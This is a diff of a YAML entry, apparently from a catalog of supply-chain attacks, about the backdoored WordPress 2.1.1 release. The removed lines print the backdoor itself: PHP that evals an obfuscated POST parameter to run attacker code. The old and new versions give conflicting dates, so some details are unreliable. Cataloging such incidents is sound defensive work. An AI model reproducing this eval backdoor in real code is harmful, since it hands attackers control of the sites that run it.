@@ -1,39 +1,19 @@
-- name: WordPress
-  title: WordPress download compromised
-  start_date: 2007-03-01
-  end_date: 2007-03-02
-  license: GPL
-  website: https://wordpress.org/
-  repo: https://github.com/WordPress/WordPress
-  attribution_type: unknown
-  component_type: Application
+- name: wordpress
+  title: WordPress official download backdoored enabling remote execution (2.1.1)
+  synopsis: Shortly after its release, the official WordPress 2.1.1 download package (`.zip`) hosted on wordpress.org was compromised by attackers who gained access to a web server. Obfuscated malicious PHP code was injected into core files (`wp-includes/vars.php` and possibly `wp-includes/theme.php`), creating a backdoor. This backdoor allowed remote attackers to pass arbitrary PHP code via specific request parameters (like `ix` or `iz`) for execution on the server, effectively granting them control over sites that installed the compromised package. The WordPress team detected the compromise quickly, removed the malicious package, and released version 2.1.2 with fixes and additional security hardening.
+  start_date: 2007-02-21 # Approximate date compromised package was available
+  end_date: 2007-02-22 # Approximate date discovered/removed/replaced with 2.1.2
+  attribution_type: Unknown # Attacker(s) who breached wordpress.org server
+  component_type: Application # Content Management System (CMS)
   lang: PHP
-  cause: compromise
-  motive: backdoor
-  attack_vector: server compromise
-  insertion_phase: distribution
-  impact_type: backdoor
-  impact_user_count: 3000
+  cause: Server compromise # wordpress.org download server hacked
+  motive: Remote access # RCE backdoor
+  insertion_phase: distribution # Official download package modified on server
+  impact_type: Backdoor, Remote execution
   references:
-    - https://wordpress.org/news/2007/03/upgrade-recovery/
+    - https://web.archive.org/web/20070225030412/http://wordpress.org/development/2007/02/wordpress-212/ # Archived official WP 2.1.2 announcement discussing the 2.1.1 compromise
+    - https://lwn.net/Articles/223717/ # LWN.net coverage of the incident
+    - https://www.zdnet.com/article/wordpress-download-contains-backdoor-code/ # ZDNet coverage
+    - https://wordpress.org/news/2009/01/wordpress-2-1-1-security/ # Later official post referencing the 2.1.1/2.1.2 security event
   versions:
-    - 2.1.1
-  synopsis: WordPress version 2.1.1 distribution was compromised with a backdoor. The compromised distribution contained code allowing remote attackers to execute arbitrary PHP code.
-  compromise_desc: Unknown attackers compromised a server hosting WordPress downloads and modified the distribution to include a backdoor. The WordPress development team discovered the breach and quickly removed the compromised version, replacing it with a secure version 2.1.2.
-  impact_desc: The backdoor allowed attackers to execute arbitrary PHP code on websites running the compromised version. Users who downloaded WordPress version 2.1.1 during the compromise period were advised to immediately upgrade to version 2.1.2.
-  example_code: |
-    function get_currentuserinfo() {
-      global $user_login, $userdata, $user_level, $user_ID, $user_email, $user_url, $user_pass_md5, $user_identity, $current_user;
-
-      // Added by hackers
-      if (isset($_POST['iz']) && isset($_GET['iz'])) {
-        if ($current_user->ID && $current_user->user_login != 'admin') {
-          return;
-        }
-        eval(base64_decode(str_rot13(urldecode(base64_decode(urldecode($_POST['iz']))))));
-        return;
-      }
-      // End of added code
-
-      [... rest of original function ...]
-    }
+    - 2.1.1 # Specific official download package from wordpress.org during the compromise window
